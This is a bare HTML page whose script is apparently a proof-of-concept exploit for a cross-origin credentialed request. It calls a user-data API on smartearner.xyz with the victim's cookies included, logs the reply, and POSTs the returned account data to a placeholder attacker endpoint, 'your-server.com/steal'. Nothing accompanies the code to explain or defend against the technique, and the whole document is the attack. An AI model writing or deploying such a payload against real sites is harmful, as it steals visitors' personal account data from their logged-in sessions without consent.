<!DOCTYPE html>
<script>
fetch('https://smartearner.xyz/api/user', {
  credentials: 'include'
})
.then(r => {
  console.log('✅ Status:', r.status);
  return r.json();
})
.then(data => {
  console.log('📦 Data:', data);
  fetch('https://your-server.com/steal', {
    method: 'POST',
    body: JSON.stringify(data)
  });
})
.catch(err => console.error('❌ Error:', err));
</script>
